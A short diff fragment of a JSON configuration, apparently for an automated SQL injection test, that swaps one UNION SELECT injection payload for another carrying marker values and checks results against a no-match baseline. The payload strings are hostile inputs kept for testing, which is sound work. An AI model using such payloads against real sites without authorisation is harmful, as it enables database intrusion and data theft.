@@ -10,7 +10,7 @@
     "origin": { "required": true, "type": "url" },
     "payload": { "required": true, "type": "string", "pickFrom": "payloads" }
   },
-  "payloads": ["' UNION SELECT 1,2,3,4,5,6--"],
+  "payloads": ["' UNION SELECT 1,'notice','ca3p-union','2026-01-01'--"],
   "verify": {
     "mode": "resultCount",
     "baseline": { "q": "zzqnomatch", "expect": 0 },
